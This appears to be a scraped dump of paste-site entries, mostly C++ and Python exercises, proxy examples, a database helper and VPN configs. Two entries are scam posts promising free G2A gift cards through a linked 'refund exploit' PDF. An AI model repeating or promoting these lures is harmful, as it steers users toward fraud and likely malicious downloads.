id,title,username,language,date,content
SPDpTaiU,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 12:52:47 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
matrix multiply_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(m_a != n_b) {
        cout << ""Matricite ne mozhat da se mnozhat"" << endl;
        return {{0}};
    }
    matrix res(n_a, vector<int>(m_b, 0));
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_b; j++) {
            int c = 0;
            for(int k = 0; k < n_a; k++) {
                c += A[i][k] * B[k][j];
            }
            res[i][j] = c;
        }
    }
    
    return res;
}
int determinant_of_matrix(matrix A) {
    int sz = (int) A.size();
    if(sz == 2) {
        return (A[0][0] * A[1][1]) - (A[0][1] * A[1][0]);
    }
    int determinant = 0;
    int sign = 1;
    for(int i = 0; i < sz; i++) {
        int n = 0, m = 0;
        
        matrix tmp(sz - 1, vector<int>(sz - 1, 0));
        for(int j = 0; j < sz; j++) {
            for(int k = 0; k < sz; k++) {
                if(j != 0 and k != i) {
                    tmp[n][m] = A[j][k];
                    if(m < sz - 2) {
                        m++;
                    }
                    else {
                        m = 0;
                        n++;
                    }
                }
            }
            
        }
        determinant = determinant + sign*(A[0][i]) * determinant_of_matrix(tmp);
        sign *= -1;
    }
    return determinant;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {1, 3, 5, 9},
        {1, 3, 1, 7},
        {4, 3, 9, 7},
        {5, 2, 0, 9}
        
    };
    matrix B = {
        {1, 2, 3},
        {4, 5, 6},
        
    };
    
    cout << determinant_of_matrix(A) << endl;
    return 0;
}
"
4iWjLgs7,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Thursday 11th of April 2024 12:45:26 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
 
Working as of:
11 April 2024"
H4YW1Sdt,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Thursday 11th of April 2024 12:41:57 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_698386.pdf

Working as of:
11 April 2024"
4CctiWLt,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 12:03:53 PM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
matrix multiply_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(m_a != n_b) {
        cout << ""Matricite ne mozhat da se mnozhat"" << endl;
        return {{0}};
    }
    matrix res(n_a, vector<int>(m_b, 0));
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_b; j++) {
            int c = 0;
            for(int k = 0; k < n_a; k++) {
                c += A[i][k] * B[k][j];
            }
            res[i][j] = c;
        }
    }
    
    return res;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {1, 2},
        {3, 4}
        
    };
    matrix B = {
        {1, 2, 3},
        {4, 5, 6},
        
    };
    
    matrix multiplied_by_k = multiply_by_k(A, 2);
    print(multiplied_by_k);
    
    matrix add_two_matrix = add_two_matrices(A, B);
    print(add_two_matrix);
    
    
    matrix subtrac_two_matrix = subtract_two_matrices(A, B);
    print(subtrac_two_matrix);
    
    matrix multiplication_two_matrices = multiply_two_matrices(A, B);
    print(multiplication_two_matrices);
    return 0;
}
"
ZvzaQpSp,Untitled,ABCD12399,C++,Thursday 11th of April 2024 11:57:04 AM CDT,"class Solution {
public:
 bool check(vector<vector<char>> &board, int no, int r, int c){
    // row
    for(int i = 0 ; i < 9 ; i++ ){
        if(board[i][c]==no)return false;
    }
    // column
    for(int j = 0 ; j < 9 ; j++ ){
        if(board[r][j]==no)return false;
    }
    // box
    int a = r%3;
    int b = c%3;
    int topLeftr = r-a;
    int topLeftc = c-b;
    for(int i = topLeftr ; i< topLeftr + 3 ; i ++){
        for(int j = topLeftc ; j < topLeftc + 3 ; j++){
            if(board[i][j]==no)return false;
        }
    }
    return true;
}
 bool findEmpty(vector<vector<char>> &board, int &r, int &c){
    for(int i = 0;i<9;i++){
        for(int j = 0 ;j<9;j++){
            if(board[i][j]=='.'){ 
                r = i;
                c = j;
                return true;
            }
            c++;
        }
        r++;
    }
    return false;
}

 bool solve(vector<vector<char>> &board){
    int r,c;
    if(!findEmpty(board, r, c)){
        return true;
    }
    for(char i = '1'; i<='9' ; i++){
        if(check(board, i, r, c)){
            board[r][c]=i;
        }
        bool flag = solve(board);
        if(flag){
            return true;
        }
        board[r][c]='.';
    }
    return false;
}
    void solveSudoku(vector<vector<char>>& board) {
        solve(board);
    }
};"
U6trLTCs,Untitled,Josif_tepe,C++,Thursday 11th of April 2024 11:35:39 AM CDT,"#include <iostream>
#include <vector>
#include <queue>
using namespace std;
typedef long long ll;
typedef vector<vector<int>> matrix;
const int maxn = 1e5 + 10;
const int INF = 2e9;

matrix multiply_by_k(matrix A, int k) {
    matrix res = A;
    int n = (int) A.size(), m = (int) A[0].size();
    
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            res[i][j] *= k;
        }
    }
    return res;
}
matrix add_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a == n_b and m_a == m_b) {
        matrix res = A;
        for(int i = 0; i < n_a; i++) {
            for(int j = 0; j < m_a; j++) {
                res[i][j] = A[i][j] + B[i][j];
            }
        }
        return res;
    }
    cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
    return {{0}};
}
matrix subtract_two_matrices(matrix A, matrix B) {
    int n_a = (int) A.size(), m_a = (int) A[0].size();
    int n_b = (int) B.size(), m_b = (int) B[0].size();
    
    if(n_a != n_b or m_a != m_b) {
        cout << ""Dimenziite na matricite treba da se isti za da mozhe da gi sobereme istite"" << endl;
        return {{0}};
    }
    matrix res = A;
    for(int i = 0; i < n_a; i++) {
        for(int j = 0; j < m_a; j++) {
            res[i][j] = A[i][j] - B[i][j];
        }
    }
    return res;
}
void print(matrix A) {
    int n = (int) A.size(), m = (int) A[0].size();
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            cout << A[i][j] << "" "";
        }
        cout << endl;
    }
    cout << endl;
}
int main() {
    matrix A = {
        {3, 2, 0},
        {1, 1, 2},
        {4, 5, 9}
    };
    matrix B = {
        {1, 1, 1},
        {1, 1, 1},
        {1, 1, 1}
    };
    
    matrix multiplied_by_k = multiply_by_k(A, 2);
    print(multiplied_by_k);
    
    matrix add_two_matrix = add_two_matrices(A, B);
    print(add_two_matrix);
    
    
    matrix subtrac_two_matrix = subtract_two_matrices(A, B);
    print(subtrac_two_matrix);
    return 0;
}
"
YFEf8QTc,Set Icon Theme for Thunar/Linux Desktop,metalx1000,Bash,Thursday 11th of April 2024 11:17:40 AM CDT,"#install a theme
sudo apt install papirus-icon-theme

#list themes
ls -I ""*.*"" /usr/share/icons

# set theme
vim ~/.config/gtk-3.0/settings.ini

#in that file set theme
gtk-icon-theme-name=Papirus

# If working with thunar, be sure to kill and restart thunar"
87TFw1g5,vector 1,LEGEND2004,C++,Thursday 11th of April 2024 11:16:02 AM CDT,"#pragma GCC optimize(""O3"")
#include <bits/stdc++.h>
using namespace std;

#define int long long
#define double long double
#define _FastIO ios_base::sync_with_stdio(0); cin.tie(0)

signed main()
{
    _FastIO;

    int n;
    cin >> n;

    // static array
    //int a[n];
    
    // dynamic array

    vector<int> a(n); // size = n ,
    /*for(int i = 0; i < n; i++){
        cin >> a[i];
    }*/

    a.push_back(5);
    cout << a.size() << '\n';
    for(int i = 0; i < a.size(); i++){
        cout << a[i] << "" "";
    }
    cout << '\n';
    cout << a.back();

    /*
    string s;
    cin >> s; // Aa0bcBC123
    sort(s.begin() , s.end());
    cout << s; // 0123ABCabc
    */
    // 0 0 0 5


}
"
npyy8qDY,Untitled,dereksir,Python,Thursday 11th of April 2024 10:49:14 AM CDT,"# import the necessary libraries
import httpx
import random

# define your proxy list
proxy_urls = [
    ""http://20.210.113.32:8123"",
    ""http://47.56.110.204:8989"",
    ""http://50.174.214.216:80"",
    # add more proxy URLs as needed
]"
fuX051WR,Untitled,dereksir,Python,Thursday 11th of April 2024 10:11:57 AM CDT,"import httpx

# define your proxy settings
proxy_url = ""http://username:password@216.137.184.253:80""

# create a client with the specified proxy and credentials
with httpx.Client(proxy=proxy_url) as client:
    # make requests using the client
    r = client.get(""https://httpbin.io/ip"")

print(r.text)"
suUpVVVx,sql_trains,SillyWolfy,Python,Thursday 11th of April 2024 10:02:16 AM CDT,"import psycopg2
def get_conn():
    return psycopg2.connect(dbname='postgres', user='postgres', password='1234', host='localhost')


def create_table_if_not_exist():
    # Подключаемся к базе данных
    conn = get_conn()
    c = conn.cursor()
    # Создание таблицы, если она не существует
    c.execute('''CREATE TABLE IF NOT EXISTS trains (TEAM bigint, ROUND integer, TRY integer, OR_NUM integer, CUR_NUM integer, SCORE integer)''')
    conn.commit()  # Фиксация изменений

    conn.close()


def check_user_exists(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            # Проверяем существование пользователя с заданным user_id
            cur.execute(""SELECT COUNT(*) FROM trains WHERE TEAM = %s"", (user_id,))
            count = cur.fetchone()[0]  # Получаем количество записей с user_id
            if count > 0:
                return 1  # Пользователь существует
            else:
                return 0  # Пользователь не существует
    finally:
        conn.close()

def update_round(user_id, new_original_place):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET ROUND=ROUND+1, TRY=6, OR_NUM=%s, CUR_NUM=%s WHERE TEAM=%s"",
              (new_original_place, new_original_place, user_id))

            conn.commit()  # Фиксация изменений

    finally:
        conn.close()

def minus_try(user_id):
    try:
        conn = get_conn()  # Предполагается, что эта функция возвращает соединение с базой данных
        with conn.cursor() as cur:
            # Обратите внимание, что аргументы после SQL запроса передаются в виде кортежа (user_id,)
            cur.execute(""UPDATE trains SET TRY=TRY-1 WHERE TEAM=%s"", (user_id,))

        conn.commit()  # Фиксация изменений
    finally:
        if conn:
            conn.close()
def add_score(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET SCORE=SCORE+1 WHERE TEAM=%s"", (user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()

def update_cur_num(updated_current_place, user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET CUR_NUM=%s WHERE TEAM=%s"", (updated_current_place, user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()
def get_user_data(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""SELECT * FROM trains WHERE TEAM = %s"", (user_id,))
            user_data = cur.fetchone()  # Получаем первую строку результата
            return user_data  # Возвращаем значения каждой колонки по user_id
    finally:
        conn.close()

def add_player(user_id):
    try:
        conn = get_conn()
        with conn.cursor() as c:
            c.execute(""INSERT INTO trains (TEAM, ROUND, TRY, OR_NUM, CUR_NUM, SCORE) VALUES (%s, 1, 6, 0, 0, 0)"",
            (user_id,))
        conn.commit()  # Фиксация изменений

    finally:
        conn.close()
def update_orig_num(user_id, new_orig_num):
    try:
        conn = get_conn()
        with conn.cursor() as cur:
            cur.execute(""UPDATE trains SET OR_NUM=%s WHERE TEAM=%s"", (new_orig_num, user_id,))

        conn.commit()  # Фиксация изменений

    finally:
        conn.close()"
wqM5ihLE,Untitled,dereksir,Python,Thursday 11th of April 2024 09:50:02 AM CDT,"import httpx

# create a client with the specified proxy
with httpx.Client(proxy=""http://216.137.184.253:80"") as client:
    # make requests using the client
    r = client.get(""https://httpbin.io/ip"")

print(r.text)"
gHRVnWvZ,список_компов_в_домене,Wintersham,Python,Thursday 11th of April 2024 09:43:17 AM CDT,"import ms_active_directory , re , os
from ping3 import ping, verbose_ping
kompy_domena = []
n = 0
j = -1
os.path.join('c','Users','BuharskyAA','Documents','ad_pcs.csv')
data = open('c:\\Users\\BuharskyAA\\Documents\\ad_pcs.csv','r')
for line in data:
   kompy_domena.append(line.split())
#    n += 1
#    kompy_domena.append(n)
pc_online = []
for i in range (len(kompy_domena)):
   print(str(kompy_domena[i][n]))
   verbose_ping(str(kompy_domena[i][n]))
   pinganem = ping(kompy_domena[i][n])
   if type (pinganem) == float:
        pinganem=int(pinganem)
        print(type(pinganem))
        print(pinganem)
        pc_online.append(kompy_domena[i][n])
        print(pc_online)

#    pinganem.round()
#          print(((pinganem)))
#          break
#    if result_of_ping[0] == 0:
#       pc_online.append(kompy_domena[i][n])
#       del result_of_ping[0]
#       print(pc_online)
#       break
#    else:
#       continue
# print(pc_online)
# print((str(kompy_domena[3])))
# print(len(kompy_domena))
# # imena_kompov = re.findall(r'[A-Z0-9]',str(kompy_domena))
# # print(imena_kompov)
# ping(str(kompy_domena[3]))
# param = '-n' if os.sys.platform().lower()=='win32' else '-c'
# hostname = kompy_domena[3] #example
# response = os.system(f""ping {param} 1 {hostname}"")
# #and then check the response...
# if response == 0:
#   print(f""{hostname} is up!"")
# else:
#   print(f""{hostname} is down!"")"
d9DWMpgt,Untitled,MR_OBRIEN,HTML,Thursday 11th of April 2024 09:37:38 AM CDT,"School Websites for Bookmark Bar

<a href=“https://teams.microsoft.com/v2/”>Microsoft Teams</a>
<a href=“https://www.microsoft365.com/launch/word?auth=2”>Microsoft Word</a>
<a href=“https://dcdsb.edsby.com/”>Durham Catholic District School Board (DCDSB)</a>
<a href=“https://durhamrc.elearningontario.ca/d2l/home”>Durham Region College (DRC) eLearning Portal</a>
<a href=“https://www.microsoft365.com/launch/onenote?auth=2”>Microsoft OneNote</a>
<a href=“https://www.microsoft365.com/launch/powerpoint?auth=2”>Microsoft PowerPoint</a>
<a href=“https://www.canva.com/”>Canva</a>"
B6bgNWXM,Untitled,MR_OBRIEN,HTML,Thursday 11th of April 2024 09:32:27 AM CDT,"<!-- Made by Distance // Chris // HTMLCoding(Pastebin) -->
<!DOCTYPE html>
<html>
  <head>
    <title>School Websites for Bookmark Bar</title>
  </head>
<!-- How to HyperLink: Use a and href then put the link in commas then use > and then put the name you want and end it with </a> -->
<!-- Example -->
<a href=""https://teams.microsoft.com/v2/"">Teams</a>
<a href=""https://www.microsoft365.com/launch/word?auth=2"">Microsoft Word</a>
<a href=""https://dcdsb.edsby.com/"">EDSBY</a>
<a href=""https://durhamrc.elearningontario.ca/d2l/home"">D2L</a>
<a href=""https://www.microsoft365.com/launch/onenote?auth=2”"">OneNote</a>
<a href=""https://www.microsoft365.com/launch/powerpoint?auth=2”"">Microsoft PowerPoint</a>
<a href=""https://www.canva.com/”"">Canva</a>
</html>"
V8V5wNit,Untitled,dereksir,Bash,Thursday 11th of April 2024 09:30:06 AM CDT,"{
  ""origin"": ""216.137.184.253:40335""
}"
tb0HJuht,Lesson27,smatskevich,C++,Thursday 11th of April 2024 09:05:59 AM CDT,"#include <iostream>
#include <queue>
#include <vector>

#define all(x) x.begin(), x.end()
using namespace std;

void BFS(int s, vector<vector<int>>& g, vector<int>& r, vector<int>& pi) {
  int n = r.size();
  queue<int> q;
  q.push(s);
  r[s] = 0;
  while (!q.empty()) {
    int u = q.front(); q.pop();
    for (int v : g[u]) {
      if (r[v] == INT_MAX) {
        r[v] = r[u] + 1;
        pi[v] = u;
        q.push(v);
      }
    }
  }
}

int main() {
  int n, m; cin >> n >> m;
  vector<vector<int>> g(n);
//  for (int i = 0; i < m; ++i)
  while (m--) {
    int u, v; cin >> u >> v;  --u; --v;
    g[u].push_back(v);
    g[v].push_back(u);
  }
  int s; cin >> s; --s;
  vector<int> r(n, INT_MAX), pi(n, -1);
  BFS(s, g, r, pi);

  for (int u = 0; u < n; ++u) {
    cout << ""Vertex "" << u + 1 << "": dist = "" << r[u] << "", path = ["";
    vector<int> path;
    for (int v = u; v != -1; v = pi[v]) path.push_back(v);
    reverse(all(path));
    for (int v : path) cout << v + 1 << (v == u ? ""]\n"" : "", "");
  }
  return 0;
}
"
aWwU6XLU,Untitled,dereksir,Python,Thursday 11th of April 2024 09:02:49 AM CDT,"import httpx

# define your proxy settings
proxies = {
    ""http://"": ""http://216.137.184.253:80"",
    ""https://"": ""http://216.137.184.253:80""
}

# make a request with the specified proxy
r = httpx.get(""https://httpbin.io/ip"", proxies=proxies)

print(r.text)"
pHZryJA7,Longest Palindromic Substring,bobbye,Python,Thursday 11th of April 2024 09:02:03 AM CDT,"class Solution:
    def longestPalindrome(self, s: str) -> str:
        if not s:
            return """"

        def expand_around_center(s: str, left: int, right: int):
            while left >= 0 and right < len(s) and s[left] == s[right]:
                left -= 1
                right += 1
            return right - left - 1


        start = 0
        end = 0

        for i in range(len(s)):
            odd = expand_around_center(s, i, i)
            even = expand_around_center(s, i, i + 1)
            max_len = max(odd, even)
            
            if max_len > end - start:
                start = i - (max_len - 1) // 2
                end = i + max_len // 2
        
        return s[start:end+1]"
CbRVieQf,Untitled,dereksir,Python,Thursday 11th of April 2024 08:50:16 AM CDT,"import httpx

# define your proxy settings
proxies = {
    ""http://"": ""http://216.137.184.253:80"",
    ""https://"": ""http://216.137.184.253:80""
}"
qyepa5xi,Untitled,dereksir,Python,Thursday 11th of April 2024 08:40:45 AM CDT,"import httpx

r = httpx.get(""https://httpbin.io/ip"")
print(r.text)"
eRFhavm7,DOMPDF,pishpeter,PHP,Thursday 11th of April 2024 08:28:35 AM CDT,"<html>
<head>
    <style>
        @page { margin: 0px; }
        body { margin: 0px; }

        /* Style for header */
        .header {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            height: 150px; /* Adjust height as needed */
            background-color: #f0f0f0;
            text-align: center;
            line-height: 100px;
            overflow: hidden;
        }
        
        /* Style for footer */
        .footer {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%; /* Set width to 100% */
            height: 200px; /* Adjust height as needed */
            background-color: #f0f0f0;
            text-align: center;
            line-height: 100px;
            overflow: hidden;
        }
        
        /* Style for images */
        .header img,
        .footer img {
            width: 100%;
            height: 100%;
            display: block;
            margin: auto;
        }

        /* Style for heading */
        .heading {
            text-align: center;
            margin-top: 200px; /* Adjust margin as needed */
        }
    </style>
</head>
<body>
    <div class=""header""><img src=""https://bidding.kaihoeastafrica.co.ke/assets/img/pdf/header.png"" alt=""Header Image""></div>
    <div class=""footer""><img src=""https://bidding.kaihoeastafrica.co.ke/assets/img/pdf/footer.png"" alt=""Footer Image""></div>
    <div class=""heading"">
        <h1>PDF Heading</h1>
    </div>
    <div class=""content"">
        <h2>Main Content</h2>
        <!-- Your content goes here -->
    </div>
</body>
</html>
"
sV8frWaf,Bruxelles,Netsemfim,Bash,Thursday 11th of April 2024 08:28:25 AM CDT,"client
dev tun
proto udp
remote bru-c16.vpn.wlvpn.com 1194
remote bru-c17.vpn.wlvpn.com 1194
remote bru-c18.vpn.wlvpn.com 1194
remote bru-c19.vpn.wlvpn.com 1194
remote bru-c20.vpn.wlvpn.com 1194
remote bru-c21.vpn.wlvpn.com 1194
remote bru-c22.vpn.wlvpn.com 1194
remote bru-c23.vpn.wlvpn.com 1194
remote bru-c24.vpn.wlvpn.com 1194
remote bru-c25.vpn.wlvpn.com 1194
remote bru-c26.vpn.wlvpn.com 1194
remote bru-c27.vpn.wlvpn.com 1194
remote bru-c13.vpn.wlvpn.com 1194
remote bru-c14.vpn.wlvpn.com 1194
remote bru-c15.vpn.wlvpn.com 1194
remote bru-c28.vpn.wlvpn.com 1194
remote bru-c29.vpn.wlvpn.com 1194
remote bru-c30.vpn.wlvpn.com 1194
remote bru-c31.vpn.wlvpn.com 1194
remote bru-c32.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
KoZIhvcNAQkBFgNWUE4wIBcNMjIwNTA5MjA0NTA2WhgPMjA4MjA0MjQyMDQ1MDZa
MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoG
A1UEChMDVlBOMQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMD
VlBOMRIwEAYJKoZIhvcNAQkBFgNWUE4wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAw
ggEKAoIBAQDJSvYEDPaAcZpeuLqtYykqpy9VNfcg5IsR8FZ/V9vbMLDHT4YUwbbn
xiQ4KJCGj9g5fnxsmmywYjjY7NmK1KKxNWlc0gF6XMZQ90qDHSpREaANb7t47JIl
gKfURSdwSUkIe3WyjRJt91CnEDzxVkwf18U4q0tjmoceLR2teb/BnL7NbtN9Xktx
7Tjq+/Yz0jn8qjjNnlWHqNOjZWsJBHDyChcHk0B1TkPvqVWFYrhnO3jCgjydFbkS
/cBYTDmhfzmPkHRNj2cSLmPS81gG4zF/8aIs7wzwsIc9fQdgGIsONl6wkK+4be9/
CcBjkIlCo2O5+macXeK+xoXR0Z6jniRZAgMBAAGjgdowgdcwDAYDVR0TBAUwAwEB
/zAdBgNVHQ4EFgQUF58B5L6R0n/5TGnCqCrIQHBjNqkwgacGA1UdIwSBnzCBnIAU
F58B5L6R0n/5TGnCqCrIQHBjNqmheaR3MHUxCzAJBgNVBAYTAlVTMQwwCgYDVQQI
EwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBOMQwwCgYDVQQLEwNWUE4x
DDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJKoZIhvcNAQkBFgNWUE6C
CQCkqr5NgknSRjANBgkqhkiG9w0BAQ0FAAOCAQEAMjkx4HQoLkLVMix6j6HVf8Lr
lKnbDlMx3gYfkD8J5LhTrf8JezB07rSialwiF7lvs3+urvQQdUs5tZCARRDpQANR
b8XzxbDu3oO4eOOxiDPnHutZv04/rN3Y/s3kSrJEwXxnWDLSzn9IsJtFtV+oHwan
ijRI4jaTBAzaqpFzq1Ffm1O1PrFfhwjb4aEyahMXCU8xRavBGKu7EeXZ78lXJVqg
0q3hbTISxRXSa63JgwxZnXcHIyeO4V/bZIcJvIei17xlc7dLDHPdnyQtrD07+AEH
qioNZsFRPJqf8KwmVCEIJq38cM7nSRXrrZ36w9P4sMBRHABQBre2DIqdo9hoeA==
-----END CERTIFICATE-----
</ca>
tls-client
remote-cert-tls server
auth-user-pass
compress lzo
verb 3
auth SHA256
cipher AES-256-CBC
"
TLYY8JGX,frankfurt,Netsemfim,Bash,Thursday 11th of April 2024 08:26:39 AM CDT,"client
dev tun
proto udp
remote fra-a01.vpn.wlvpn.com 1194
remote fra-a03.vpn.wlvpn.com 1194
remote fra-a06.vpn.wlvpn.com 1194
remote fra-a13.vpn.wlvpn.com 1194
remote fra-a14.vpn.wlvpn.com 1194
remote fra-a15.vpn.wlvpn.com 1194
remote fra-a05.vpn.wlvpn.com 1194
remote fra-a07.vpn.wlvpn.com 1194
remote fra-a02.vpn.wlvpn.com 1194
remote fra-a09.vpn.wlvpn.com 1194
remote fra-a08.vpn.wlvpn.com 1194
remote fra-a10.vpn.wlvpn.com 1194
remote fra-a11.vpn.wlvpn.com 1194
remote fra-a16.vpn.wlvpn.com 1194
remote fra-a17.vpn.wlvpn.com 1194
remote fra-a18.vpn.wlvpn.com 1194
remote fra-a19.vpn.wlvpn.com 1194
remote fra-a20.vpn.wlvpn.com 1194
remote fra-a21.vpn.wlvpn.com 1194
remote fra-a22.vpn.wlvpn.com 1194
remote fra-a23.vpn.wlvpn.com 1194
remote fra-a12.vpn.wlvpn.com 1194
remote fra-a24.vpn.wlvpn.com 1194
remote fra-a25.vpn.wlvpn.com 1194
remote fra-a26.vpn.wlvpn.com 1194
remote fra-a27.vpn.wlvpn.com 1194
remote fra-a28.vpn.wlvpn.com 1194
remote fra-a29.vpn.wlvpn.com 1194
remote fra-a30.vpn.wlvpn.com 1194
remote fra-a31.vpn.wlvpn.com 1194
remote fra-a32.vpn.wlvpn.com 1194
remote fra-a33.vpn.wlvpn.com 1194
remote fra-a34.vpn.wlvpn.com 1194
remote fra-a35.vpn.wlvpn.com 1194
remote fra-a36.vpn.wlvpn.com 1194
remote fra-a37.vpn.wlvpn.com 1194
remote fra-a38.vpn.wlvpn.com 1194
remote fra-a39.vpn.wlvpn.com 1194
remote fra-a40.vpn.wlvpn.com 1194
remote fra-a41.vpn.wlvpn.com 1194
remote fra-c09.vpn.wlvpn.com 1194
remote fra-c10.vpn.wlvpn.com 1194
remote fra-c11.vpn.wlvpn.com 1194
remote fra-c12.vpn.wlvpn.com 1194
remote fra-c13.vpn.wlvpn.com 1194
remote fra-c14.vpn.wlvpn.com 1194
remote fra-c15.vpn.wlvpn.com 1194
remote fra-c01.vpn.wlvpn.com 1194
remote fra-c02.vpn.wlvpn.com 1194
remote fra-c03.vpn.wlvpn.com 1194
remote fra-c04.vpn.wlvpn.com 1194
remote fra-c07.vpn.wlvpn.com 1194
remote fra-c08.vpn.wlvpn.com 1194
remote fra-c05.vpn.wlvpn.com 1194
remote fra-a04.vpn.wlvpn.com 1194
remote fra-c06.vpn.wlvpn.com 1194
remote fra-c16.vpn.wlvpn.com 1194
remote-random
resolv-retry infinite
nobind
persist-key
persist-tun
persist-remote-ip
<ca>
-----BEGIN CERTIFICATE-----
MIIESjCCAzKgAwIBAgIJAKSqvk2CSdJGMA0GCSqGSIb3DQEBDQUAMHUxCzAJBgNV
BAYTAlVTMQwwCgYDVQQIEwNWUE4xDDAKBgNVBAcTA1ZQTjEMMAoGA1UEChMDVlBO
MQwwCgYDVQQLEwNWUE4xDDAKBgNVBAMTA1ZQTjEMMAoGA1UEKRMDVlBOMRIwEAYJ
